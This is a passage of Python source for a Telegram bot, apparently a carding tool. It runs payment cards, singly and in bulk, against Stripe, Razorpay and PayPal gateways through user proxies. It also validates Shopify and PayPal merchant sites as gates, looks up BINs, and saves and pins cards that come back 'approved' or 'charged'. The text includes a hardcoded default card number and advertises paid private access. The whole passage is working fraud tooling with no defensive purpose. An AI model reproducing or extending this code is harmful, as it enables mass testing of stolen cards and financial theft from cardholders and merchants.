@client.on(events.NewMessage(pattern=r'(?i)^[/.]aps(?:\s|$)'))
async def check_paypal_sites_handler(event):
    if not is_admin(event.sender_id):
        return

    raw_text = event.raw_text.split(maxsplit=1)[1] if len(event.raw_text.split(maxsplit=1)) > 1 else ""
    card = extract_card(raw_text) or "4542427934949878|06|30|774"
    sites = extract_paypal_sites_from_text(raw_text)
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text:
            sites.extend(extract_paypal_sites_from_text(replied_msg.text))
        elif replied_msg and replied_msg.document:
            file_path = await replied_msg.download_media()
            try:
                async with aiofiles.open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    file_content = await f.read()
                sites.extend(extract_paypal_sites_from_text(file_content))
            finally:
                try: os.remove(file_path)
                except: pass

    sites = list(dict.fromkeys(sites)) or await load_paypal_sites()
    total = len(sites)
    status_msg = await event.reply(premium_emoji(f"⚙️ <b>Checking PayPal Sites...</b>\n\n📊 Total: <code>{total}</code>"), parse_mode='html')
    checked, working, dead = 0, 0, 0
    report_lines = []

    for site in sites:
        try:
            res = await check_paypal_site(site, card, SSL_CONTEXT, log_endpoint)
            checked += 1
            response = report_safe_response(res)
            status = res.get("Status", "Unknown")
            raw_response = f"{res.get('Response', '')} {res.get('Message', '')} {res.get('Raw', '')}".lower()
            validation_error = "validation_error" in raw_response or "unprocessable_entity" in raw_response
            token_error = "token_extraction_error" in raw_response
            if status.lower() in ["charged", "declined", "approved"] and not validation_error and not token_error:
                working += 1
                site_status = "WORKING"
            else:
                dead += 1
                site_status = "DEAD"
            report_lines.append(f"{site} | {site_status} | HTTP {res.get('HTTPStatus', '-')} | {status} | {response}")
        except Exception as e:
            checked += 1
            dead += 1
            report_lines.append(f"{site} | ERROR | {str(e)}")

        try:
            await status_msg.edit(premium_emoji(f"⚙️ <b>Checking PayPal Sites...</b>\n\n✅ Working: <code>{working}</code>\n❌ Dead: <code>{dead}</code>\n📊 Progress: <code>{checked}/{total}</code>"), parse_mode='html')
        except:
            pass

    report_stream = io.BytesIO()
    report_data = f"📊 PAYPAL SITE CHECK REPORT | Checked: {checked}/{total}\n"
    report_data += f"Working: {working} | Dead: {dead}\n"
    report_data += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    report_data += "\n".join(report_lines)
    report_stream.write(report_data.encode("utf-8"))
    report_stream.seek(0)
    report_stream.name = "PayPal_Site_Report.txt"

    caption = premium_emoji(f"✅ <b>PayPal Site Check Complete!</b>\n\n✅ Working: <code>{working}</code>\n❌ Dead: <code>{dead}</code>\n📊 Checked: <code>{checked}/{total}</code>")
    try:
        await status_msg.delete()
    except:
        pass
    await event.respond(caption, file=report_stream, parse_mode='html')

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rmpxy(?:\s|$)'))
async def remove_proxy(event):
    # This command works in private only
    if event.is_group:
        return await event.reply(premium_emoji("💎 𝙏𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙤𝙣𝙡𝙮 𝙬𝙤𝙧𝙠𝙨 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩!", mode="md"))
    
    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())
    
    try:
        proxies = await load_json(PROXY_FILE)
        user_proxies = proxies.get(str(event.sender_id), [])
        
        if not user_proxies:
            return await event.reply(premium_emoji("❌ 𝙔𝙤𝙪 𝙙𝙤𝙣'𝙩 𝙝𝙖𝙫𝙚 𝙖𝙣𝙮 𝙥𝙧𝙤𝙭𝙮 𝙨𝙖𝙫𝙚𝙙!", mode="md"))
        
        parts = event.raw_text.split(maxsplit=1)
        
        # If no argument, show usage
        if len(parts) == 1:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /rmpxy <index>\n𝙊𝙧: /rmpxy all\n\n𝙐𝙨𝙚 /proxy 𝙩𝙤 𝙨𝙚𝙚 𝙞𝙣𝙙𝙚𝙭 𝙣𝙪𝙢𝙗𝙚𝙧𝙨")
        
        arg = parts[1].strip().lower()
        
        # Remove all proxies
        if arg == 'all':
            del proxies[str(event.sender_id)]
            await save_json(PROXY_FILE, proxies)
            return await event.reply(premium_emoji(f"✅ 𝘼𝙡𝙡 {len(user_proxies)} 𝙥𝙧𝙤𝙭𝙞𝙚𝙨 𝙧𝙚𝙢𝙤𝙫𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮!", mode="md"))
        
        # Remove by index
        try:
            index = int(arg) - 1  # Convert to 0-based index
            
            if index < 0 or index >= len(user_proxies):
                return await event.reply(premium_emoji(f"❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙞𝙣𝙙𝙚𝙭!\n\n𝙔𝙤𝙪 𝙝𝙖𝙫𝙚 {len(user_proxies)} 𝙥𝙧𝙤𝙭𝙞𝙚𝙨 (1-{len(user_proxies)})", mode="md"))
            
            removed_proxy = user_proxies.pop(index)
            
            if user_proxies:
                proxies[str(event.sender_id)] = user_proxies
            else:
                del proxies[str(event.sender_id)]
            
            await save_json(PROXY_FILE, proxies)
            
            await event.reply(premium_emoji(f"✅ 𝙋𝙧𝙤𝙭𝙮 𝙧𝙚𝙢𝙤𝙫𝙚𝙙!\n\n💎 {removed_proxy['ip']}:{removed_proxy['port']}\n📊 𝙍𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜: {len(user_proxies)}", mode="md"))
            
        except ValueError:
            return await event.reply(premium_emoji("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙞𝙣𝙙𝙚𝙭!\n\n𝙐𝙨𝙚: /rmpxy 1 𝙤𝙧 /rmpxy all", mode="md"))
        
    except Exception as e:
        await event.reply(premium_emoji(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}", mode="md"))

@client.on(events.NewMessage(pattern=r'(?i)^[/.]proxy(?:\s|$)'))
async def view_proxy(event):
    if event.is_group:
        return await event.reply(premium_emoji("💎 𝙏𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙤𝙣𝙡𝙮 𝙬𝙤𝙧𝙠𝙨 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩!", mode="md"))
    
    try:
        user_proxies = await get_all_user_proxies(event.sender_id)
        if not user_proxies:
            return await event.reply(premium_emoji("❌ 𝙔𝙤𝙪 𝙙𝙤𝙣'𝙩 𝙝𝙖𝙫𝙚 𝙖𝙣𝙮 𝙥𝙧𝙤𝙭𝙮 𝙨𝙖𝙫𝙚𝙙!", mode="md"))
        
        total = len(user_proxies)
        proxy_list = f"💎 **𝙔𝙤𝙪𝙧 𝙋𝙧𝙤𝙭𝙮 𝘿𝙖𝙩𝙖𝙗𝙖𝙨𝙚** ({total}/100)\n\n"
        
        # Only show the last 15 added to keep the message clean
        display_list = user_proxies[-15:] 
        
        for idx, p in enumerate(display_list, 1):
            auth = "💎" if p.get('username') else "?"
            proxy_list += f"`{idx}.` {auth} `{p['ip']}:{p['port']}`\n"
            
        if total > 15:
            proxy_list += f"\n*... and {total - 15} more saved proxies.*"
            
        proxy_list += f"\n\n**Commands:**\n• `/rmpxy all` - Clear database\n• `/addpxy` - Paste new list"
        await event.reply(premium_emoji(proxy_list, mode="md"))
    except Exception as e:
        await event.reply(premium_emoji(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}", mode="md"))
        
@client.on(events.CallbackQuery(pattern=r"pr_(.*):(\d+)"))
async def process_price_selection(event):
    price_range = event.pattern_match.group(1).decode()
    owner_id = int(event.pattern_match.group(2).decode())
    
    if event.sender_id != owner_id:
        return await event.answer("❌ This is not your upload!", alert=True)

    sites_to_test = TEMP_SITE_UPLOAD.get(owner_id)
    if not sites_to_test:
        return await event.edit(premium_emoji("❌ **Session expired.** Please re-upload your sites.", mode="md"))

    await event.edit(premium_emoji(f"⚙️ **Processing {len(sites_to_test)} sites for Range: {price_range}...**\nTesting Shopify Status, please wait.", mode="md"))

    # Logic to check sites in batches of 10 to prevent API spam
    working_data = []
    dead_count = 0
    checked_count = 0
    
    # Process Verification
    batch_size = 10
    for i in range(0, len(sites_to_test), batch_size):
        batch = sites_to_test[i:i+batch_size]
        tasks = [test_single_site(site, user_id=owner_id) for site in batch]
        results = await asyncio.gather(*tasks)
        
        for res in results:
            checked_count += 1
            if res['status'] == 'working':
                working_data.append({
                    "url": res['site'],
                    "price": res['price'],
                    "range": price_range,
                    "status": "Working"
                })
            else:
                dead_count += 1
        
        # Update progress every batch
        try:
            await event.edit(premium_emoji(f"⚙️ **Progress:** `{checked_count}/{len(sites_to_test)}` sites\n? Working: `{len(working_data)}` | ? Dead: `{dead_count}`", mode="md"))
        except: pass

    # 6. Save to Database (user_sites.json)
    sites_db = await load_json(SITE_FILE)
    user_list = sites_db.get(str(owner_id), [])
    
    # Convert old list strings to new dict objects if necessary
    formatted_user_list = []
    for item in user_list:
        if isinstance(item, str):
            formatted_user_list.append({"url": item, "status": "Unknown", "range": "Unknown", "price": "-"})
        else:
            formatted_user_list.append(item)

    existing_keys = {site_dedupe_key(x) for x in formatted_user_list}
    for site in working_data:
        key = site_dedupe_key(site)
        if key and key not in existing_keys:
            formatted_user_list.append(site)
            existing_keys.add(key)

    sites_db[str(owner_id)] = dedupe_sites(formatted_user_list)
    await save_json(SITE_FILE, sites_db)

    # 7. Final Detailed Report
    report_header = f"✅ **Final Verification Report**\n💎 Range: `{price_range}`\n━━━━━━━━━━━━━━\n"
    report_body = ""
    for site in working_data:
        report_body += f"💎 `{site['url']}`\n💰 Price: `{site['price']}` | ✅ Working\n\n"
    
    if not report_body:
        report_body = "❌ No working Shopify sites found in this batch."
    
    footer = f"━━━━━━━━━━━━━━\n📊 Total Added to DB: `{len(working_data)}`"
    
    # Clean up temp storage
    TEMP_SITE_UPLOAD.pop(owner_id, None)

    # Handle long messages
    if len(report_header + report_body + footer) > 4096:
        # If report is too long, send file or truncated message
        await event.respond(premium_emoji(report_header + "*(Report too long, check /info)*" + footer, mode="md"))
    else:
        await event.respond(premium_emoji(report_header + report_body + footer, mode="md"))        

@client.on(events.NewMessage(pattern=r'(?i)^[/.]bin(?:\s+(.+))?$'))
async def bin_lookup_handler(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+0EgyvdopAvszODQ8")]]
        return await event.reply(premium_emoji("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙂𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙈𝙧 𝘽𝙖𝙙 𝙂𝙪𝙮", mode="md"), buttons=buttons)

    raw_input = event.pattern_match.group(1) or ""
    if not raw_input and event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text:
            raw_input = replied_msg.text

    card = extract_card(raw_input)
    digits = re.sub(r"\D", "", raw_input)
    bin_number = card.split("|")[0][:6] if card else digits[:6]

    if len(bin_number) < 6:
        return await event.reply(premium_emoji("𝙁𝙤𝙧𝙢𝙖𝙩 💎 /bin 411111\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙘𝙖𝙧𝙙 𝙤𝙧 𝘽𝙄𝙉", mode="md"))

    loading_msg = await event.reply(premium_emoji("💎", mode="md"))
    start_time = time.time()

    try:
        brand, bin_type, level, bank, country, flag = await get_bin_info(bin_number)
        elapsed_time = round(time.time() - start_time, 2)

        msg = f"""𝘽𝙄𝙉 𝙇𝙊𝙊𝙆𝙐𝙋 💎

𝗕𝗜𝗡 ⇾ `{bin_number}`
𝗕𝗿𝗮𝗻𝗱 ⇾ {brand}
𝗧𝘆𝗽𝗲 ⇾ {bin_type}
𝗟𝗲𝘃𝗲𝗹 ⇾ {level}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```

𝗧𝗼𝗼𝙠 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝙨
𝘽𝙊𝙏 𝘽𝙔 <a href="tg://user?id={OWNER_ID}">𝙈𝙧 𝘽𝙖𝙙 𝙂𝙪𝙮</a>
"""

        await loading_msg.delete()
        await event.reply(premium_emoji(msg, mode="md"))
    except Exception as e:
        await loading_msg.delete()
        await event.reply(premium_emoji(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}", mode="md"))

async def process_rz_card(event, access_type):
    if not await ensure_no_active_batch(event): return
    card = None
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text: card = extract_card(replied_msg.text)
        if not card: return await event.reply(premium_emoji("𝘾𝙤𝙪𝙡𝙙𝙣'𝙩 𝙚𝙭𝙩𝙧𝙖𝙘𝙩 𝙫𝙖𝙡𝙞𝙙 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤 𝙛𝙧𝙤𝙢 𝙧𝙚𝙥𝙡𝙞𝙚𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚\n\n𝙁𝙤𝙧𝙢𝙖𝙩 💎 /𝙧𝙯 4111111111111111|12|2025|123", mode="md"))
    else:
        card = extract_card(event.raw_text)
        if not card: return await event.reply(premium_emoji("𝙁𝙤𝙧𝙢𝙖𝙩 💎 /rz 4111111111111111|12|2025|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝙘𝙧𝙚𝙙𝙞𝙩 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤"), parse_mode="html")

    loading_msg = await event.reply(premium_emoji("💎", mode="md"))
    start_time = time.time()

    try:
        res = await check_razor_card(card, None, SSL_CONTEXT, log_endpoint)
        elapsed_time = round(time.time() - start_time, 2)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
        display_response = report_safe_response(res)
        status_text = res.get("Status", "").lower()
        is_charged = False

        if status_text == "maxed out":
            status_header = "⚠️ Retry Maxed Out (5/5)"
            status_result = "Maxed Out"
            display_response = "Retry Maxed Out"
        elif status_text == "charged":
            status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💰"
            status_result = "Charged"
            is_charged = True
            sender = await event.get_sender()
            name = sender.first_name or "Unknown"
            await save_approved_card(event.sender_id, name, card, status_result, res.get('Response'), res.get('Gate'), res.get('Price'))
        else:
            status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
            status_result = "Declined"

        # Premium Razorpay Layout with GIF
        status_icon = "💰" if is_charged else "❌"
        status_title = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" if is_charged else "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿"
        if status_text == "maxed out":
            status_icon = "⚠️"
            status_title = "𝙍𝙚𝙩𝙧𝙮 𝙈𝙖𝙭𝙚𝙙 𝙊𝙪𝙩"
        
        sender = await event.get_sender()
        user_name = sender.first_name or "Unknown"
        
        msg = create_premium_gate_layout(
            status_icon, status_title, card, display_response, "Razorpay",
            brand, bin_type, level, bank, country, flag, event.sender_id, user_name, elapsed_time
        )
        
        await loading_msg.delete()
        gif_url = get_gate_gif("Razorpay")
        result_msg = await event.reply(premium_emoji(msg, mode="md"), file=await _safe_gif(gif_url))
        if is_charged: await pin_charged_message(event, result_msg)
    except Exception as e:
        await loading_msg.delete()
        await event.reply(premium_emoji(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}", mode="md"))

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rz'))
async def rz(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    await enforce_gate_access(event)
    if not await ensure_no_active_batch(event): return
    asyncio.create_task(process_rz_card(event, access_type))

@client.on(events.NewMessage(pattern=r'(?i)^[/.]mrz'))
async def mrz(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    await enforce_gate_access(event)

    if not await ensure_no_active_batch(event): return

    proxy_data = await get_user_proxy(event.sender_id)
    cards = []
    from_file = False
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.document:
            from_file = True
            file_path = await replied_msg.download_media()
            try:
                async with aiofiles.open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    raw_text = await f.read()
            finally:
                try: os.remove(file_path)
                except: pass
            cards = extract_all_cards(raw_text)
        elif replied_msg and replied_msg.text:
            cards = extract_all_cards(replied_msg.text)
    else:
        cards = extract_all_cards(event.raw_text)

    if not cards:
        return await event.reply(premium_emoji("𝙁𝙤𝙧𝙢𝙖𝙩. /𝙢𝙧𝙯 4111111111111111|12|2025|123 4111111111111111|12|2025|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙩𝙭𝙩 𝙛𝙞𝙡𝙚 / 𝙘𝙖𝙧𝙙 𝙡𝙞𝙨𝙩 𝙬𝙞𝙩𝙝 /𝙢𝙧𝙯", mode="md"))

    total_cards_found = len(cards)
    if from_file:
        cc_limit = get_cc_limit(access_type, event.sender_id)
        if len(cards) > cc_limit:
            cards = cards[:cc_limit]
            await event.reply(premium_emoji(f"📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚\n⚠️ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 {cc_limit} 𝘾𝘾𝙨 (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩)", mode="md"))
    elif len(cards) > 20:
        cards = cards[:20]
        await event.reply(premium_emoji(f"``` ⚠️ 𝙊𝙣𝙡𝙮 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙛𝙞𝙧𝙨𝙩 20 𝙘𝙖𝙧𝙙𝙨 𝙤𝙪𝙩 𝙤𝙛 {total_cards_found} 𝙥𝙧𝙤𝙫𝙞𝙙𝙚𝙙. 𝙇𝙞𝙢𝙞𝙩 𝙞𝙨 20 𝙘𝙖𝙧𝙙𝙨 𝙛𝙤𝙧 /𝙢𝙧𝙯 𝙢𝙨𝙜.```", mode="md"))

    try:
        sender = await event.get_sender()
        name = sender.first_name or "User"
    except:
        name = "User"

    ACTIVE_PROCESSES[event.sender_id] = {
        "name": name,
        "checked": 0,
        "total": len(cards),
        "hits": 0,
        "start_time": time.time()
    }

    task, batch_id = start_batch_task(event.sender_id, process_mrz_cards(event, cards, proxy_data), "mrz", name, "Razorpay")
    RUNNING_TASKS[event.sender_id] = task

async def process_mrz_cards(event, cards, proxy_data):
    try:
        sender = await event.get_sender()
        username = sender.first_name or sender.username or f"user_{event.sender_id}"
    except:
        username = f"user_{event.sender_id}"

    batch_id = USER_BATCHES.get(event.sender_id, "N/A")
    total = len(cards)
    checked, approved, charged, declined = 0, 0, 0, 0
    if event.sender_id not in ACTIVE_PROCESSES:
        ACTIVE_PROCESSES[event.sender_id] = {"name": username, "checked": 0, "total": total, "hits": 0, "start_time": time.time()}
    active_data = ACTIVE_PROCESSES[event.sender_id]
    results_for_report = []
    last_card = "N/A"
    last_res = "N/A"
    last_ui_update = 0
    semaphore = asyncio.Semaphore(10)
    status_msg = await event.reply(premium_emoji(f"💎 <b>Razorpay Cooking</b>\n\n🎱 <b>Batch ID:</b> <code>{batch_id}</code>\n📊 <b>Total:</b> <code>{total}</code>"), parse_mode='html')

    async def throttled_razor_check(card):
        async with semaphore:
            start_time = time.time()
            result = await check_razor_card(card, proxy_data, SSL_CONTEXT, log_endpoint)
            elapsed_time = round(time.time() - start_time, 2)
            return card, result, elapsed_time

    tasks = [asyncio.create_task(throttled_razor_check(card)) for card in cards]

    try:
        for completed_task in asyncio.as_completed(tasks):
            try:
                card, result, elapsed_time = await completed_task
            except Exception as e:
                card, result, elapsed_time = "Unknown", {"Response": f"Exception: {str(e)}", "Gate": "Razorpay", "Status": "Error"}, 0

            checked += 1
            active_data["checked"] = checked
            display_response = report_safe_response(result)
            status_text = result.get("Status", "").lower()
            gate = result.get("Gate", "Razorpay")
            last_card = card
            last_res = display_response

            if status_text == "charged":
                charged += 1
                hit_status = "Charged"
                status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💰"
            elif status_text == "approved":
                approved += 1
                hit_status = "Approved"
                status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
            else:
                declined += 1
                if status_text != "maxed out":
                    hit_status = "Declined"
                else:
                    hit_status = "Maxed Out"

            results_for_report.append(f"{card} | {hit_status} | {display_response} | {gate}")

            is_charged = (hit_status == "Charged")

            if hit_status in ["Charged", "Approved"]:
                active_data["hits"] = charged + approved
                brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
                await save_approved_card(event.sender_id, username, card, hit_status, result.get('Response'), gate, "-")

                sender = await event.get_sender()
                user_name = sender.first_name or "Unknown"
                user_id = event.sender_id

                status_icon = "💰" if is_charged else "✅"
                status_title = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" if is_charged else "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿"

                card_msg = create_premium_gate_layout(
                    status_icon=status_icon,
                    status_title=status_title,
                    card=card,
                    display_response=display_response,
                    gate="Razorpay",
                    brand=brand,
                    bin_type=bin_type,
                    level=level,
                    bank=bank,
                    country=country,
                    flag=flag,
                    user_id=user_id,
                    user_name=user_name,
                    elapsed_time=elapsed_time
                )

                gif_url = get_gate_gif("Razorpay")
                result_msg = await event.reply(premium_emoji(card_msg, mode="md"), file=await _safe_gif(gif_url))
                if is_charged:
                    await pin_charged_message(event, result_msg)

            if checked == total or (time.time() - last_ui_update) > 3:
                last_ui_update = time.time()
                _bar_size = 10
                _filled = int(_bar_size * checked / total) if total else 0
                progress_bar = f"[{'█' * _filled}{'░' * (_bar_size - _filled)}]"
                percentage = int(100 * checked / total) if total else 0
                last_card_truncated = f"{last_card[:20]}..." if len(last_card) > 20 else last_card
                last_response_clean = f"{last_res[:50]}..." if len(last_res) > 50 else last_res
                progress_text = (
                    f"{premium_emoji('💎')} <b>Razorpay Cooking</b>\n\n"
                    f"{premium_emoji('🎱')} <b>Batch ID:</b> {batch_id}\n"
                    f"{progress_bar} {percentage}%\n"
                    f"{premium_emoji('🔄')} <b>Checked:</b> {checked}/{total}\n"
                    f"{premium_emoji('🔥')} <b>Approved:</b> {approved}\n"
                    f"{premium_emoji('💰')} <b>Charged:</b> {charged}\n"
                    f"{premium_emoji('❌')} <b>Declined:</b> {declined}\n\n"
                    f"<b>𝗟𝗮𝘀𝘁:</b> <code>{last_card_truncated}</code>\n"
                    f"<b>Ｒ𝗲𝘀:</b> {last_response_clean}"
                )
                buttons = build_mass_progress_buttons(
                    "charging", approved, charged, declined, checked, total,
                    f"stop_mrz:{event.sender_id}".encode()
                )
                try: await status_msg.edit(progress_text, buttons=buttons, parse_mode="html")
                except: pass
    finally:
        pending_tasks = [task for task in tasks if not task.done()]
        if pending_tasks:
            for task in pending_tasks:
                task.cancel()
            await asyncio.gather(*pending_tasks, return_exceptions=True)

        report_stream = io.BytesIO()
        report_data = f"📊 MRZ RAZORPAY REPORT | Checked: {checked}/{total}\n"
        report_data += f"Status: {'COMPLETED' if checked == total else 'STOPPED'}\n"
        report_data += f"Charged: {charged} | Approved: {approved} | Declined: {declined}\n"
        report_data += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        report_data += "\n".join(results_for_report)
        report_stream.write(report_data.encode('utf-8'))
        report_stream.seek(0)
        report_stream.name = "MRZ_Results.txt"

        caption = premium_emoji(f"✅ <b>Razorpay Mass Check Complete!</b>\n\n💎 Charged: {charged}\n🔥 Approved: {approved}\n❌ Declined: {declined}\n📊 Scanned: {checked}/{total}")
        try:
            await status_msg.delete()
        except:
            pass
        await event.respond(caption, file=report_stream, parse_mode='html')
        ACTIVE_PROCESSES.pop(event.sender_id, None)
        RUNNING_TASKS.pop(event.sender_id, None)

async def process_chk_card(event, access_type):
    if not await ensure_no_active_batch(event): return
    card = None
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text: card = extract_card(replied_msg.text)
        if not card: return await event.reply(premium_emoji("𝘾𝙤𝙪𝙡𝙙𝙣'𝙩 𝙚𝙭𝙩𝙧𝙖𝙘𝙩 𝙫𝙖𝙡𝙞𝙙 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤 𝙛𝙧𝙤𝙢 𝙧𝙚𝙥𝙡𝙞𝙚𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚\n\n𝙁𝙤𝙧𝙢𝙖𝙩 💎 /𝙘𝙝𝙠 4111111111111111|12|2025|123", mode="md"))
    else:
        card = extract_card(event.raw_text)
        if not card: return await event.reply(premium_emoji("𝙁𝙤𝙧𝙢𝙖𝙩 💎 /chk 4111111111111111|12|2025|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝙘𝙧𝙚𝙙𝙞𝙩 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤"), parse_mode="html")

    loading_msg = await event.reply(premium_emoji("💎", mode="md"))
    start_time = time.time()

    try:
        res = await check_stripe_card(card, None, SSL_CONTEXT, log_endpoint)
        elapsed_time = round(time.time() - start_time, 2)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
        display_response = report_safe_response(res)
        status_text = res.get("Status", "").lower()
        is_charged = False

        if status_text == "maxed out":
            status_header = "⚠️ Retry Maxed Out (5/5)"
            status_result = "Maxed Out"
            display_response = "Retry Maxed Out"
        elif status_text == "approved":
            status_header = "✅ 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿"
            status_result = "Approved"
            is_charged = True
            sender = await event.get_sender()
            name = sender.first_name or "Unknown"
            await save_approved_card(event.sender_id, name, card, status_result, res.get('Response'), res.get('Gate'), res.get('Price'))
        elif status_text == "3ds required":
            status_header = "🔐 3𝘿𝙎 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙙"
            status_result = "3DS Required"
        else:
            status_header = "❌ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿"
            status_result = "Declined"

        # Premium Stripe Auth Layout with GIF
        status_icon = "✅" if status_text == "approved" else "❌"
        status_title = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿" if status_text == "approved" else "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿"
        if status_text == "maxed out":
            status_icon = "⚠️"
            status_title = "𝙍𝙚𝙩𝙧𝙮 𝙈𝙖𝙭𝙚𝙙 𝙊𝙪𝙏"
        elif status_text == "3ds required":
            status_icon = "🔐"
            status_title = "3𝘿𝙎 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙙"
        
        sender = await event.get_sender()
        user_name = sender.first_name or "Unknown"
        
        msg = create_premium_gate_layout(
            status_icon, status_title, card, display_response, "Stripe Auth",
            brand, bin_type, level, bank, country, flag, event.sender_id, user_name, elapsed_time
        )
        
        await loading_msg.delete()
        gif_url = get_gate_gif("Stripe Auth")
        result_msg = await event.reply(premium_emoji(msg, mode="md"), file=await _safe_gif(gif_url))
        if is_charged: await pin_charged_message(event, result_msg)
    except Exception as e:
        await loading_msg.delete()
        await event.reply(premium_emoji(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}", mode="md"))

@client.on(events.NewMessage(pattern=r'(?i)^[/.]chk'))
async def chk(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    await enforce_gate_access(event)
    if not await ensure_no_active_batch(event): return
    asyncio.create_task(process_chk_card(event, access_type))

@client.on(events.NewMessage(pattern=r'(?i)^[/.]mchk'))
async def mchk(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    await enforce_gate_access(event)

    if not await ensure_no_active_batch(event): return

    cards = []
    from_file = False
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.document:
            from_file = True
            file_path = await replied_msg.download_media()
            try:
                async with aiofiles.open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    raw_text = await f.read()
            finally:
                try: os.remove(file_path)
                except: pass
            cards = extract_all_cards(raw_text)
        elif replied_msg and replied_msg.text:
            cards = extract_all_cards(replied_msg.text)
    else:
        cards = extract_all_cards(event.raw_text)

    if not cards:
